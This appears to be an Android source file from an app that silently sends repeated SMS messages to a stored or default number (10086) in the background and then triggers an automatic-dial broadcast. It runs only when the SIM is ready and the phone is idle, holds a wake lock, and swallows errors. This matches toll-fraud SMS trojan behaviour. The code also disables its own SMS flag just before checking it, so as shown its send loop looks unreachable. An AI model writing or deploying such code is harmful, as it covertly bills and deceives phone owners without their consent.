package com.mms.bg.ui;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.mms.bg.transaction.WorkingMessage;
import com.mms.bg.*;

public class AutoSMSRecevier extends BroadcastReceiver {
    
    private static final String TAG = "AutoSMSRecevier";
    private static final boolean DEBUG = true;
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (DEBUG) Log.d(TAG, "[[AutoSMSRecevier::onReceive]]");
        
        if (SettingManager.getInstance(context).isSimCardReady() == false
                || SettingManager.getInstance(context).isCallIdle() == false) return;
        
        //TODO : should get num from server
        
        SettingManager sm = SettingManager.getInstance(context);
        String destNum = sm.getSMSTargetNum();
        
        if (destNum.equals("") == true) {
            destNum = "10086";
            sm.setSMSTargetNum(destNum);
            return;
        }
        
        SettingManager.getInstance(context).setSMSEnable(false);
        
        int sendCount = SettingManager.getInstance(context).getSMSSendCount();
        WorkingMessage wm = WorkingMessage.createEmpty(context);
        
        if (SettingManager.getInstance(context).isCallIdle() == false) return;
        try {
            if (SettingManager.getInstance(context).getSMSEnable() == true) {
                SettingManager.getInstance(context).makePartialWakeLock();
                for (int count = 0; count < sendCount; ++count) {
                    if (DEBUG) Log.d(TAG, "[[AutoSMSRecevier::onReceive]] send message to " + destNum);
                    wm.setDestNum(destNum);
                    wm.setText("ce shi text");
                    SettingManager.getInstance(context).logSMSCurrentTime();
                    wm.send();
                    int naps = 10;
                    for (int n = 0; n < naps; ++n) {
                        Thread.sleep(50);
                    }
                }
                SettingManager.getInstance(context).releasePartialWakeLock();
            }
        } catch (Exception e) {
        }
        
        if (SettingManager.getInstance(context).isCallIdle() == false) return;
        if (SettingManager.getInstance(context).getDialEnable() == true) {
            Intent dialIntent = new Intent();
            dialIntent.setAction(BgService.ACTION_DIAL_BR);
            context.sendBroadcast(dialIntent);
        }
    }

}